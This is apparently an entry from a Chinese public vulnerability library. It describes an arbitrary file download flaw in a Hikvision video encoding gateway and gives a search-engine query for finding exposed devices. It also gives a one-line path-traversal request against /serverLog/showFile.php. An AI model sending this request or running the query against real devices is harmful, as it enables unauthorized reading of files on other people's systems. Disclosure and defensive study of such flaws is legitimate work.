---
fofa: "web.title="
source: "wy876 漏洞文库"
---

# 海康威视视频编码设备接入网关 showFile.php 任意文件下载漏洞

# 一、漏洞简介
海康威视视频接入网关系统在页面`/serverLog/showFile.php`的参数fileName存在任意文件下载漏洞

# 二、影响版本
+ HIKVISION 视频编码设备接入网关

# 三、资产测绘
+ hunter：`web.title="视频编码设备接入网关"&&app.name=="Hikvision 海康威视视频编码设备接入网关"`


+ 登录页面


# 四、漏洞复现
```plain
/serverLog/showFile.php?fileName=../web/html/main.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mq89stc9hxmf3fw1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
